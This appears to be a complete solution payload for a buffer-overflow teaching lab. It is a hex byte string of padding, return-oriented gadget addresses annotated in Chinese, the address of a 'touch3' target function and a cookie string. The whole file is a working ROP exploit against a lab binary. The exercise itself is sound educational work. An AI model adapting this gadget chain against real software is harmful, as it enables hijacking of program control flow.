00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00     # 前0x28个字符填充0x00
cc 19 40 00 00 00 00 00     # popq %rax
20 00 00 00 00 00 00 00     # 偏移量
42 1a 40 00 00 00 00 00     # movl %eax, %edx
69 1a 40 00 00 00 00 00     # movl %edx, %ecx
27 1a 40 00 00 00 00 00     # movl %ecx, %esi
06 1a 40 00 00 00 00 00     # movq %rsp, %rax
c5 19 40 00 00 00 00 00     # movq %rax, %rdi
d6 19 40 00 00 00 00 00     # add_xy
c5 19 40 00 00 00 00 00     # movq %rax, %rdi
fa 18 40 00 00 00 00 00     # touch3地址
35 39 62 39 39 37 66 61     # 目标字符串
00 00 00 00 00 00 00 00
